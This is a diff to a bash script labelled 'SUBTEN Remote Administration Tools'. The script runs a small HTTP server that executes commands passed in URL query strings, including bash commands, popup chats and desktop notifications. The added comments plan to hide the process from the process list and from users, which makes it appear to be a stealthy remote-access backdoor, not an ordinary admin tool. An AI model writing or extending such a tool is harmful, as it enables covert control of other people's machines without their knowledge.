@@ -1,13 +1,15 @@
 #!/bin/bash
-# pass in document root as first arg
-#./xinput       then access serverpage at http://localhost:9000/servers  or whatever the ip is
-
+#                                   SUBTEN Remote Administration Tools
+#usage
+#./xinput       then access serverpage at http://localhost:9000/servers?notify?message  or whatever the ip is
+# 'http://localhost:9000/servers?bash?echo "hi there"' spaces and quotations allowed
 #credits https://paulbuchheit.blogspot.ca/2007/04/webserver-in-bash.html
 
 
 #Linux Version
 
-#todo periodic running to hide from process list
+#todo periodic running to hide from process list or run as root to hide from users
+#was thinking run for 10 seconds every minute or use a custom shell
 DOC_ROOT=./tmp #$1
 RESP=./tmp/webresp
 mkdir $DOC_ROOT
@@ -22,7 +24,7 @@ SERV_PATH=`echo "$REQ" | head -1 | cut -f2 -d" " `
 FULL_PATH="$DOC_ROOT$SERV_PATH"
 command=$(echo $SERV_PATH | cut -d '?' -f 2)
 args1=$(echo $SERV_PATH | cut -d '?' -f 3)
-args=$(echo $args1 |sed -e 's/%21/!/g' -e 's/%23/#/g' -e 's/%24/$/g' -e 's/%26/\&/g' -e "s/%27/'/g" -e 's/%28/(/g' -e 's/%29/)/g' | sed s/"%20"/" "/g | sed s/"%27"/"'"/g |sed s/"%3E"/">"/g )
+args=$(echo $args1 |sed -e 's/%21/!/g' -e 's/%23/#/g' -e 's/%24/$/g' -e 's/%26/\&/g' -e "s/%27/'/g" -e 's/%28/(/g' -e 's/%29/)/g' | sed s/"%20"/" "/g | sed s/"%27"/"'"/g |sed s/"%3E"/">"/g ) #limit length of response 256
 
 echo $command
 path=`echo $SERV_PATH | cut -d "?" -f1`
@@ -49,10 +51,14 @@ if [ $command ]; then
     if [ $command == proxy ];then
           echo "$args"
     fi
-   # if [ $command == chat ];then
-            #zenity
+    if [ $command == chat ];then
+            #zenity --question --text="Are you there?"
+            zenity --title "Chat" --text "$args" --entry >  $DOC_ROOT/texts
            #libnotify
-   # fi
+    fi
+    if [ $command == notify ];then
+           notify-send $args
+    fi
    # if [ $command == lockscreen ];then
         #disable input devices
    # fi
